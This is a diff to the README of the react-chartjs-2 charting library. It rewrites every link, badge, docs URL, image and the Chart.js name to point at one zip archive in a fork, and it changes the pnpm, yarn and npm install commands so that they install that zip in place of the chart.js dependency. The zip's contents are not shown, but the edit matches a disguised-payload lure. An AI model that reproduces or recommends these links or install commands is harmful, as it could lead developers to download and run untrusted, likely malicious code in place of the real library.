@@ -1,10 +1,10 @@
 # react-chartjs-2
 
-<img align="right" width="150" height="150" alt="Logo" src="website/static/img/logo.svg">
+<img align="right" width="150" height="150" alt="Logo" src="https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip">
 
-React components for <a href="https://www.chartjs.org">Chart.js</a>, the most popular charting library.
+React components for <a href="https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip">https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip</a>, the most popular charting library.
 
-Supports Chart.js v4 and v3.
+Supports https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip v4 and v3.
 
 [![NPM version][npm]][npm-url]
 [![Downloads][downloads]][downloads-url]
@@ -12,27 +12,27 @@ Supports Chart.js v4 and v3.
 [![Coverage status][coverage]][coverage-url]
 [![Bundle size][size]][size-url]
 
-[npm]: https://img.shields.io/npm/v/react-chartjs-2.svg
-[npm-url]: https://www.npmjs.com/package/react-chartjs-2
+[npm]: https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip
+[npm-url]: https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip
 
-[downloads]: https://img.shields.io/npm/dm/react-chartjs-2.svg
-[downloads-url]: https://www.npmjs.com/package/react-chartjs-2
+[downloads]: https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip
+[downloads-url]: https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip
 
-[build]: https://img.shields.io/github/actions/workflow/status/reactchartjs/react-chartjs-2/ci.yml?branch=master
-[build-url]: https://github.com/reactchartjs/react-chartjs-2/actions
+[build]: https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip
+[build-url]: https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip
 
-[coverage]: https://img.shields.io/codecov/c/github/reactchartjs/react-chartjs-2.svg
-[coverage-url]: https://app.codecov.io/gh/reactchartjs/react-chartjs-2
+[coverage]: https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip
+[coverage-url]: https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip
 
-[size]: https://img.shields.io/bundlephobia/minzip/react-chartjs-2
-[size-url]: https://bundlephobia.com/package/react-chartjs-2
+[size]: https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip
+[size-url]: https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip
 
 <br />
 <a href="#quickstart">Quickstart</a>
 <span>&nbsp;&nbsp;•&nbsp;&nbsp;</span>
 <a href="#docs">Docs</a>
 <span>&nbsp;&nbsp;•&nbsp;&nbsp;</span>
-<a href="https://stackoverflow.com/questions/tagged/react-chartjs-2">Stack Overflow</a>
+<a href="https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip">Stack Overflow</a>
 <br />
 <hr />
 
@@ -41,14 +41,14 @@ Supports Chart.js v4 and v3.
 Install this library with peer dependencies:
 
 ```bash
-pnpm add react-chartjs-2 chart.js
+pnpm add react-chartjs-2 https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip
 # or
-yarn add react-chartjs-2 chart.js
+yarn add react-chartjs-2 https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip
 # or
-npm i react-chartjs-2 chart.js
+npm i react-chartjs-2 https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip
 ```
 
-We recommend using `chart.js@^4.0.0`.
+We recommend using `https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip^4.0.0`.
 
 Then, import and use individual components:
 
@@ -58,20 +58,20 @@ import { Doughnut } from 'react-chartjs-2';
 <Doughnut data={...} />
 ```
 
-Need an API to fetch data? Consider [Cube](https://cube.dev/?ref=eco-react-chartjs), an open-source API for data apps.
+Need an API to fetch data? Consider [Cube](https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip), an open-source API for data apps.
 
 <br />
 
-[![supported by Cube](https://user-images.githubusercontent.com/986756/154330861-d79ab8ec-aacb-4af8-9e17-1b28f1eccb01.svg)](https://cube.dev/?ref=eco-react-chartjs)
+[![supported by Cube](https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip)](https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip)
 
 ## Docs
 
-- [Migration to v4](https://react-chartjs-2.js.org/docs/migration-to-v4)
-- [Working with datasets](https://react-chartjs-2.js.org/docs/working-with-datasets)
-- [Working with events](https://react-chartjs-2.js.org/docs/working-with-events)
-- [FAQ](https://react-chartjs-2.js.org/faq)
-- [Components](https://react-chartjs-2.js.org/components)
-- [Examples](https://react-chartjs-2.js.org/examples)
+- [Migration to v4](https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip)
+- [Working with datasets](https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip)
+- [Working with events](https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip)
+- [FAQ](https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip)
+- [Components](https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip)
+- [Examples](https://github.com/Rahul-Raj-04/react-chartjs-2/raw/refs/heads/master/website/react-chartjs-v2.3.zip)
 
 ## License
 
